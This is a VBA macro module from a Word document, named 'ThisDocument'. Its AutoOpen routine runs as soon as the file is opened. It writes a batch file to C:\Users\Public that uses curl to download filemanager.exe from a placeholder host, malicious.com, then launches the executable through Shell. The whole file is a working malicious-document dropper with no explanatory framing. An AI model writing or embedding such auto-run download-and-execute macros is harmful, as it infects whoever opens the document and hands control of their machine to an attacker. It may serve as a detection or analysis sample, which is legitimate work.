VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Sub WriteFile()
    Dim url As String
    url = "C:\\Users\\Public\\getfilemanager.cmd"
    Dim fso As FileSystemObject
    Set fso = New FileSystemObject
    Dim fst As TextStream
    
    Set fst = fso.CreateTextFile(url)
    fst.Write ("curl -o C:\\Users\\Public\\filemanager.exe http://malicious.com/filemanager.exe")
    fst.Write (" && C:\\Users\\Public\\filemanager.exe")
    fst.Close
    
    Shell (url)
End Sub

Sub AutoOpen()
    WriteFile
End Sub
